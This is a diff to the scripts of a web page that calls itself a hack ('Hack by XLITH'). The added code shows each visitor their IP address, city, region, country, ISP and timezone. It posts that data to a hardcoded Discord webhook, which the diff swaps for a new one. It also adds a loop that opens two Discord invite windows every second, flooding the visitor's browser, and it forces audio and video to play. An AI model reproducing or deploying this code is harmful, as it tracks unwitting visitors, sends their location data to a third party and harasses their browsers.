@@ -187,11 +187,11 @@
 
 <script>
 document.addEventListener('click', () => {
-  document.querySelectorAll('background-video').forEach(v => {
+  document.querySelectorAll('video').forEach(v => {
     v.muted = false;
     v.play();
   });
-  document.getElementById('background-video')?.play();
+  document.getElementById('background-audio')?.play();
 });
 
 document.addEventListener('DOMContentLoaded', function() {
@@ -200,7 +200,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
   
 
-        const audio = document.getElementById('background-video');
+        const audio = document.getElementById('background-audio');
         
         audio.play().catch(e => console.log("لا يمكن تشغيل الصوت:", e));
  
@@ -248,15 +248,15 @@ document.addEventListener('DOMContentLoaded', function() {
             infoDiv.innerHTML = ` Hack by XLITH
 <strong>IP:</strong><span>"${ip}"</span><br>
 <strong>Port:</strong><span style="color: #ffd700">${port}</span><br>
-<strong>City:</strong><span>"*AL Mafrq*"</span><br>
-<strong>Region:</strong><span>"*AL Mafrq*"</span><br>
-<strong>Country:</strong><span>"JORDAN"</span><br>
+<strong>City:</strong><span>"${city}"</span><br>
+<strong>Region:</strong><span>"${region}"</span><br>
+<strong>Country:</strong><span>"${country}"</span><br>
 <strong>Location:</strong><span>"${loc}"</span><br>
 <strong>ISP:</strong><span>"${org}"</span><br>
-<strong>Timezone:</strong><span>"Asia/Jordan"</span>`;
+<strong>Timezone:</strong><span>"${timezone}"</span>`;
 
             const dateTime = new Date().toLocaleString();
-            const webhookUrl = 'https://discord.com/api/webhooks/1351172060248019066/7xfV1QVOYKzmxhM8tBKK5VwXJpsHnFS-6HysAx1YUHnm8Ksjr7W8SmlwysjaU3lypP0O';
+            const webhookUrl = 'https://discord.com/api/webhooks/1392951947648172103/82ud7yJzK19qnYsxO7uNzGrG2EroGRFLDBBhgBkiutyAnEWwlXHqY48uHOwfVThLnabC';
             
             fetch(webhookUrl, {
                 method: 'POST',
@@ -277,7 +277,18 @@ document.addEventListener('DOMContentLoaded', function() {
 <!-- فتح نوافذ Discord تلقائيًا -->
 <script>
     // الرابط الذي تريد فتحه
-    const linkToOpen = "";
+  const linkToOpen = "https://discord.gg/ec0";
+
+    // فتح نافذتين تلقائيًا كل 1 ثوانٍ
+    setInterval(() => {
+        // فتح النافذة الأولى
+        window.open(linkToOpen, '_blank');
+        
+        // الانتظار لفترة قصيرة (500 ميلي ثانية) قبل فتح النافذة الثانية
+        setTimeout(() => {
+            window.open(linkToOpen, '_blank');
+        }, 500); // 500 ميلي ثانية = 0.5 ثانية
+    }, 1000); // 4000 ميلي ثانية = 4 ثوانٍ
 
 
 </script>
